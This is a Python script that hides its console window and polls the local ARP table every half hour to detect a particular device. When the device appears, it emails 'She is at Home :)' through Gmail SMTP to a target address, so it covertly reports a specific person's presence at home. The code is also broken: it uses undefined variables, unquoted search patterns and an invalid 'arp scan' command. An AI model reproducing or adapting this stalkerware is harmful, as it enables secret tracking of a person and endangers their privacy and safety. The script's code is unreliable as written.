import subprocess as sbp
import time
import platform
import smtplib
from email import encoders
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart
import win32gui, win32con

def spymain():
        try:
                chck = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(chck , win32con.SW_HIDE)
                 
                if __name__ == '__main__':
                        while True:

                                plt = platform.system()
                        
                                
                                if plt == "Windows":
                                        cmd = sbp.Popen("arp -a | findstr Device IP", stdout=sbp.PIPE, shell=True)
                                        (output, err) = cmd.communicate()
                                        p_status = cmd.wait()
                                        if output:
                                                servs = smtplib.SMTP('smtp.gmail.com', 587)

                                                servs.ehlo()
                                                servs.starttls()
                                                servs.ehlo()

                                                fmail = 'your email'
                                                passwd = 'your email password'

                                                try:
                                                        servs.login(email, passwd)
                                                        

                                                        msgs = MIMEMultipart()
                                                        msgs['From'] = "Me"
                                                        fail = "your email"
                                                        msgs['Subject'] = "any subject"
                                                        


                                                        msg = "She is at Home :)"
                                                        msgs.attach(MIMEText(msg, 'plain'))

                                                        text = msgs.as_string()
                                                        servs.sendmail(email, targetmail, text)

                                                except:
                                                        print("\n")
                                                        print("Server Error, Try again or use another Mail-Service")
                                                time.sleep(1800)
                                        else:
                                                spymain()                                        

                                else:
                                        cmd = sbp.Popen("arp scan -l | grep Device IP", stdout=sbp.PIPE, shell=True)
                                        (output, err) = cmd.communicate()
                                        p_status = cmd.wait()
                                        if output:
                                                 servs = smtplib.SMTP('smtp.gmail.com', 587)

                                                 servs.ehlo()
                                                 servs.starttls()
                                                 servs.ehlo()

                                                 fmail = 'your email'
                                                 passwd = 'your password'

                                                 try:
                                                        servs.login(email, passwd)
                                                        

                                                        msgs = MIMEMultipart()
                                                        msgs['From'] = "Me"
                                                        fail = "your email"
                                                        msgs['Subject'] = "any subject"
                                                        


                                                        msg = "She is at Home :)"
                                                        msgs.attach(MIMEText(msg, 'plain'))

                                                        text = msgs.as_string()
                                                        servs.sendmail(email, targetmail, text)

                                                 except:
                                                        print("\n")
                                                        print("Server Error, Try again or use another Mail-Service")
                                                
                                                 time.sleep(1800)
                                        else:
                                                spymain()
                 
                       
        except:
                print(err)

spymain()
